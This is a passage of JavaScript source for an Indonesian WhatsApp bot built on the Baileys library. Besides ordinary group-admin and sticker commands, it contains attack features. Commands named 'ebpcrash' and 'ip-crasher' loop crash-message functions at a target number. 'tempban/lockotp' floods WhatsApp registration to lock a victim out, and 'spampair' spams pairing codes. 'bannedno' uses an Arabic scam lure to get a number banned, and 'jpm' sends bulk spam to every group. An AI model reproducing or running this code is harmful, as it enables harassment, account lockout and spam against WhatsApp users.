‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
ekuzika.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case "kick": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ekuzika.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case 'closegroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
ekuzika.groupSettingUpdate(m.chat, 'announcement')
reply(`Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin`)
}, timer)
}
break

case 'opengroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
ekuzika.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}, timer)
}
break

case "demote": {
if (!isPremium) return reply(mess.only.premium)
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ekuzika.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "promote": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ekuzika.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "jpmpromosi": case "jpmpromo": case "jpm": {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
if (!text && !m.quoted) return m.reply("teksnya atau replyteks")
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await ekuzika.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let teksnya = teks
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6283874176696\",\"merchant_url\":\"https://whatsapp.com/channel/0029VapVjjr1noz8wOgd6144"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"YouTube Owner\",\"url\":\"${linkyt}\",\"merchant_url\":\"https://youtube.com/@ekuzikaxzoo\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testi Di whatsapp\",\"url\":\"${isLink}\",\"merchant_url\":\"https://whatsapp.com/channel/0029VapVjjr1noz8wOgd6144\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Donate My Dev🙏\",\"url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\",\"merchant_url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\"}"
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
for (let jid of usergc) {
try {
await ekuzika.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break

case 'payment': {
let teks = `${monospace("PAYMENT")}

*(E-WALLET)*

   *DANA*
- ${dana}

Harap Setelah Transfer Anda Harus Mengasih Bukti Pembayaran Agar Di Verifikasi Oleh Owner, Tanks For You

© ${storename}`
ekuzika.sendMessage(from, { 
text: teks,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": false,
"title": `QRIS? KLIK DISINI`,
"body": `Date : ${wib}, ${tanggal}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnailUrl": `${qris}`,
"sourceUrl": `${qris}`
}
}
},{ 
quoted: fkontak })
await sleep(1500)
}
      break

case "danamasuk": {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
let teks = `*DONE DANA MASUK*

Reqname :

▰▰▰▰▰▰▰▰
*Garansi 7 Day*
*Create ${wib}*
*Hari Ini ${hariini}*`
ekuzika.sendMessage(from, { text : teks }, { quoted : m })
}
break

case 'proses':{
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
m.reply('*SIAP PESANAN ANDA AKAN KAMI PROSES JADI DI MOHON UNTUK MENUNGGU SEBENTAR YA MEK*')
ekuzika.sendMessage(`${owner}@s.whatsapp.net`, { text: `BANG ${namacreator} ADA YANG TRX NIH CEPETAN PROSES NANTI BUYER NGAMOK`, contextInfo: { forwardingScore: 9999, isForwarded: true }})
}
break

case 'bannedno': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
if (!q) return reply('Enter the Target number Prefix "+" and Country Code')
await ekuzika.sendMessage(m.chat, {text: `اربح المال بسهولة عبر الإنترنت لمدة ساعة واحدة بسعر 10 آلاف💰.\nفقط في هذا الاستبيان، قم بتسجيل حسابك على الفور، ما عليك سوى رقم واتساب جاهز للاتصال بالإنترنت 🤑.\nلا تفوت هذه الفرصة، سجل الآن باستخدام رمز QR 📄\n\nقم بالرد بـ "1" وانقر على الرابط أدناه 👇\nhttps://server.go-share.top/\n\nوتواصل مع WhatsApp الخاص بي إذا كنت ترغب في الحصول على مكافأة!!🎁\nhttps://api.whatsapp.com/send?phone=${q}`},{quoted: m})
sleep(2000)
return reply(`👆  text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
}
break

case 'infono': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
if (!q) return reply(' Enter the Target number Prefix "+" and Country Code')
await ekuzika.sendMessage(m.chat, {text: `informasi kontak
Name : ${m.pushName}
Number : ${q}
Status : *${ekuzika ? '✅' : `❌`}*`},{quoted: m})
}
break

case 'tqto': {
return reply(`Big Thanks To

   ᨟ Ekuzika (Dev)
   ᨟ Zynxzoo (For Base)
   ᨟ PakTzy (For Inspiration)
   ᨟ Gybrant (BestSupport)
   ᨟ Pxyra (BestSupport)
   ᨟ Dhika (BestSupport)
   ᨟ Axez (BestSupport)
   `)
}
break

case 'infobot': {
infobot = {
image: xbug,
caption: `▬▭▬▭▬▭▬▭▬▬▭▬▭▬
BOT : AKTIF
DEVELOPER : EKUZIKA
OWNER : ${namacreator}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`
}
ekuzika.sendMessage(m.chat, infobot)
}
break

case "lockotp":
 case "tempban": {
          if (!isOwner) return 
          if (!q) return reply(`Example: ${prefix + command} country_code|number\n\nExample: ${prefix + command} 62|8xxx`)
          //let numbers = JSON.parse(fs.readFileSync('./database/dtbs/tempban.json'))
          let cCode = q.split("|")[0]
          let number = q.split("|")[1]
          let fullNo = cCode + number
          reply(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time.\nRegistration interruption will be stopped if success 10000x registration.`)
          try {
              let {
    				makeWaSocket,
    				saveCreds,
    				fetchLatestBaileysVersion
       			  } = useMultiFileAuthState('./tempban') //('@whiskeysockets/baileys')
			  
let res = await ekuzika.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
method: "sms"
});
} catch (err) {}

for (let i = 0; i < 10000; i++) {
					try {
						var ekuzikaPrefix = Math.floor(Math.random() * 999);
						var ekuzikaSuffix = Math.floor(Math.random() * 999);
						await ekuzika.register(`${ekuzikaPrefix}-${ekuzikaSuffix}`);
					} catch (err) {
						console.log(`Register code :\n${ekuzikaPrefix}-${ekuzikaSuffix}\n`);
					}
				}
			}
			break

case 'spampair': {
const usePairingCode = true
const NodeCache = require("node-cache")
const resolveMsgBuffer = new NodeCache()
			if (!isOwner) return
			if (!q) return reply(`*Syntax Error!*\n\n_Use : spampair 62xx|10`)
			let [peenis, pepekk = "1000"] = q.split("|")
			await reply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
			//await reaction(m.chat, "✅")
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@whiskeysockets/baileys')
			let {
				state
			} = await useMultiFileAuthState('pairSess')
			let {
				version
			} = await fetchLatestBaileysVersion()
			let sucked = await makeWaSocket({
				auth: state,
				logger: pino({ level: "silent" }),
					level: 'fatal'
				})
			for (let i = 0; i < pepekk; i++) {
			await sleep(1000)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(2000)
		}
		break

case 'antibugon': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!") 
global.antibug = true
return reply('sukses mengaktifkan antibug')
}
break

case 'antibugoff': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!") 
global.antibug = false
return reply('sukses menonaktifkan antibug')
}
break

case 'unlockbug':
case 'unlockbuk':
case 'bukabug':
case 'bukabuk': {
if (!isPremium) return reply(mess.only.premium)
if (!isOwner) return reply("`Owner Only !!`")
if (!q) return reply("Nomor mna yg mau di unlock buk nya?")
target = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
reply("`Tunggu Bentar . . .`")
for (let i = 0; i < 1; i++) {
await unlock(target, dottm)
}
reply("`Udah tuh . . .`")
}
break

case 'done': case 'd': {
if (!isOwner) return reply(`Njirr Sok Asik lu`)
let s = text.split(',')
let barang = s[0]
let nominal = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal`)
if (!barang) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} vipies,60000`)
if (!nominal) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} panel,1000`)
text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

📦 Barang : ${barang}
💸 Nominal : ${nominal}
📆 Tanggal : ${wib}
🕰️ Waktu : ${time2}
✨ Status : Berhasil

𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 𝗗𝗶 *${storename}*`
await ekuzika.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: `${nominal}*100000`,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break

case "sticker": 
case "stiker":
case "s": {
//if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ekuzika.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await ekuzika.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break

case "stext": 
case "stickertext": 
case "stikertext":
case "steks": 
case "stickerteks":
case "stikerteks": {
//if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
if (!text) return reply(`Example: ${prefix+command} ebpcrash go to famous`)
if (text.length > 40) return reply(`Text terlalu panjang! Maksimal 40 huruf.`)
let media = `https://mannoffc-x.hf.space/brat?q=${text}`
let encmedia = await ekuzika.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}
break

case 'togif': {
//if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
if (!mime) return reply(`Kirim/Reply Video yang ingin dijadikan Gif dengan caption ${prefix+command}\n`)
//const { ext } = 
reply('`Wait Process . . .`')
let media = await quoted.download()
ekuzika.sendMessage(m.chat, { video: media, caption: "", gifPlayback: true })
}
break

case "tourl": {
//if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
if (!mime) return reply(`Kirim/Reply Media yang ingin dijadikan url dengan caption ${prefix+command}\n`)
//const { ext } = 
reply('`Wait Process . . .`')
let media = await quoted.download()
//let meda = Buffer.from(media).toString("base64")
let encmedia = await uploadPomf2(media)
reply(` \`Success . . .\`

▢ Name:* ${encmedia.files[0].name}
▢ *Url:* ${encmedia.files[0].url}
▢ *Size:* ${encmedia.files[0].size}
  `)
//await fs.unlinkSync(media)
}
break

case 'eval': {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
if (!m.quoted) return reply(`*Reply pesan yang quotednya mau diambil*`);
const kripto = require('crypto')
let jembut = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
let turok = `MessageData_${kripto.randomBytes(8).toString('hex')}.json`;

await fs.writeFileSync(turok, jembut);
await reply(jembut);
await ekuzika.sendMessage(m.chat, { document: { url: `./${turok}` }, fileName: turok, mimetype: '*/*' }, { quoted: fpay });
await fs.unlinkSync(turok);
}
break

case 'hd':
case 'remini':
case 'upscale': {
if (!quoted) return reply(`Kirim/reply foto yang ingin di jernih kan dengan caption ${prefix + command}`)
if (!isPremium) return reply(mess.only.premium)
if (/image/.test(mime)) {
let mm = await quoted.download();
const processing = require("@xyroinee/photo-enhance");
const fs = require("fs");
reply('`Wait Process . . .`')

processing(mm, "enhance").then(async(buffer) => {
  // Save image buffer
  fs.writeFileSync("./database/tmp/result_enhance.jpg", buffer);
  ekuzika.sendMessage(m.chat, { image: fs.readFileSync("./database/tmp/result_enhance.jpg"), caption: "`Success menjernihkan gambar`" }, { quoted: fpay })
  await sleep(1000)
  await fs.unlinkSync("./database/tmp/result_enhance.jpg")
});
} else {
reply(`Kirim/Reply Gambar Dengan Caption ${prefix+command}\n`)
}
}
break

case "cek":
case 'tes': {
if (!isPremium) return reply(mess.only.premium)
reply(`On nih . . .\nRuntime: ${run}`)
}
break

case 'autoai': {
if (!isPremium) return reply(mess.only.premium)

ekuzika.CAI = ekuzika.CAI ? ekuzika.CAI : {};

    if (!q) return reply(`*Contoh:* .autoai *[on/off]*`);

    if (q === "on") {
        ekuzika.CAI[sender] = {
            messages: []
        };
        reply(`[ ✓ ] ᴀᴜᴛᴏ ᴀɪ ʙᴏᴛ *\`ᴇʙᴘᴄʀᴀsʜ\`* : ᴀᴋᴛɪғ [ √ ]`);
    } else if (q === "off") {
        delete ekuzika.CAI[sender];
        reply(`[ ✓ ] ᴀᴜᴛᴏ ᴀɪ *\`ᴇʙᴘᴄʀᴀsʜ\`* : ɴᴏɴᴀᴋᴛɪғ [ √ ]`);
    }
};
break

case 'ebpcrash': case 'xebp': case 'c2kucium': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
var kon = q.replace(/[^0-9]/g, '');

if (kon == "628889616144") {
return reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 *_Developer_* !!')
} 
if (kon == "6282228286802") {
return reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧 !!')
} 
if (kon == "6285814677025") {
return reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 *_Bot_* !!')
} 
if (kon == "6282337715208") {
return reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 *_Bot_* !!')
} 

await loadingbuk()
for (let i = 0; i < 30; i++) {
await Floods3(target)
await FaxzLocOs4(target)
await ClPmNull(target, null, xbug, (cct = true), (ptcp = true));
await StuckNull(target, xbug, (Ptcp = true));
await Floods3(target)
await tamaLoca(target)
await ClGc(target)
await sleep(900)
await tamaDocu(target)
await FaxzLocOs4(target)
await StuckNull(target, xbug, (Ptcp = true));
await ClPmNull(target, null, xbug, (cct = true), (ptcp = true));
await ClPmNull(target, null, xbug, (cct = true), (ptcp = true));
await StuckNull(target, xbug, (Ptcp = true));
await FaxzLocOs4(target)
await Floods3(target)
await ClGc(target)
await sleep(1000)
}
}
break

// End case bug with number
// Case bug without number

case 'c2?': case 'tau-exz?': case 'tau-gybran?': case 'tau-gybrant?': case 'tau-pxyra?': case 'tau-petra?': {
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
target = m.chat

var kon = target.split('@')[0]

if (kon == "628889616144") {
return reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 *_Developer_* !!')
} 
if (kon == "6282228286802") {
return reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧 !!')
} 
if (kon == "6285814677025") {
return reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 *_Bot_* !!')
} 
if (kon == "6282337715208") {
return reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 *_Bot_* !!')
} 

await loadingbuk()
for (let i = 0; i < 30; i++) {
await ClPmNull(target, null, xbug, (cct = true), (ptcp = true));
await StuckNull(target, xbug, (Ptcp = true));
await tamaLoca(target)
await ClGc(target)
await sleep(900)
await tamaDocu(target)
await StuckNull(target, xbug, (Ptcp = true));
await ClPmNull(target, null, xbug, (cct = true), (ptcp = true));
await ClPmNull(target, null, xbug, (cct = true), (ptcp = true));
await StuckNull(target, xbug, (Ptcp = true));
await ClGc(target)
await sleep(1000)
}
}
break

// End case bug without number
// Case bug Iphone Crash 

case 'ip-crasher': case 'xebp-ip': case 'gasip': case 'gas-ip': {
if (!isPremium) return reply(mess.only.premium)
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
var kon = q.replace(/[^0-9]/g, '');

if (kon == "628889616144") {
return reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 *_Developer_* !!')
} 
if (kon == "6282228286802") {
return reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧 !!')
} 
if (kon == "6285814677025") {
return reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 *_Bot_* !!')
} 
if (kon == "6282337715208") {
return reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 *_Bot_* !!')
} 

reply('\`𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 . . .\` \n\n**Noted:* _Silahkan jeda 5 - 10 menit setelah bug selesai di proses_')
await sleep(1000)
jumlah = 2
for (let i = 0; i < 10; i++) {
sendAllPaymentInvites(target, jumlah)
await sleep(900)
await InVisiLoc(target, xbug, true);
await sleep(900)
await invisIos(target, true)
await sleep(900)
await newfreezebug(target)
await sleep(900)
await StuckSql(target, xbug, true)
await sleep(900)
sendQP(target, _0x140c8a, Porke, Porke2)
await StuckSql(target, xbug, true)
await sleep(900)
await tamaLoca(target)
  await sleep(900)
  await tamaDocu(target)
await sendSessionStructure(target, _0x140c8a)
await sleep(900)
await PayMent(target)
await sleep(900)
await StukLoc(target, _0x140c8a, xbug, true)
await sleep(900)
await ClGc(target)
await sleep(900)
await CallCrash(target, xbug, true);
await sleep(900)
await NewsletterZap(target)
await sleep(900)
await tamaDocu(target)
await sleep(900)
await tamaLoca(target)
  await sleep(900)
  await tamaDocu(target)
await sleep(900)
await BrutalOverload(target);
await sleep(1000)
}
reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
}
break

case "owner": {
if (!isPremium) return reply('Mau Ngapain Dek ??')
const repf = await ekuzika.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
ekuzika.sendMessage(from, { text : `Nih Owner Gw Jangan Macem"`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
